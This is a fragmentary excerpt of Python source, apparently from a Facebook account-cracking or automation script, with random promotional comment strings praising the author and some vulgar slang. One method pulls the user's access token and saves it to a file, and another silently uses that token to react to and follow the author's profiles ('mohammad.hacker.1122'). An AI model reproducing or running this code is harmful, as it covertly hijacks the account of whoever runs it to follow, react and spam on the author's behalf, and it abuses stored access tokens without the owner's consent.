...
kom=random.choice(["Aap Afandi Ganteng:)","Lo Ngentod:v","Yang Posting Orang Nya Ganteng:)","Mantap:v","Be Yourself And Never Surrentod:v","Keren Bro Script Nya:)","Hi mohammad sultani  i am user MBF script    (love you Mohammad sultani) ^_^"])
class ganteng:
	...
	def reaksi(self):
		self.get_tok();self.dahlah(f"{self.url}/100027060438331","4","ah sit");self.dahlah(f"{self.url}/100027060438331","8","ah sit");self.tuturkeun("mohammad.hacker.1122");self.tuturkeun("100027060438331")
	def lang(self,cok):
		try:
	...
	def get_tok(self):
		try:
			...
			if b is not None:
				...
				open("Mohammad/token","w").write(b.group(1))
		except:pass
